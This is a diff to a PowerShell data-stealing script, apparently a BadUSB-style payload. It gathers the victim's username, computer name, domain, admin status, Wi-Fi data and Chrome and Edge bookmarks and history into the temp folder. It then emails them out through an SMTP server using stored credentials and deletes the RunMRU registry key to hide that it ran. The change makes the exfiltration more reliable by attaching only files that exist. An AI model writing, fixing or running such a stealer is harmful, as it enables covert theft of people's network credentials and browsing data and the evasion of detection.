@@ -46,5 +46,16 @@ $F2 = "$env:USERNAME-USB.csv"
 $u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
 $Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: ww<br>Admin: xx</h3>" -replace "3333",$name  -replace "::",$computername -replace "ww",$domain -replace "xx",$admin
 
-Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2,$env:tmp/wifi.txt,$env:tmp/$edgbook,$env:tmp/$chrbook,$env:tmp\$chrhis,$env:tmp\$edghis" 
+$Report = @("$env:tmp\$F2")
+$Report += "$env:tmp\wifi.txt"
+$files = "$env:tmp\$edgbook","$env:tmp\$chrbook","$env:tmp\$chrhis","$env:tmp\$edghis"
+foreach ($file in $files){
+if ((Test-Path -Path $file -PathType Leaf) -eq $true){
+$ps = [PSCustomObject]@{
+patch = $file}
+$Report += $ps.patch
+}
+}
+
+Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments $Report 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
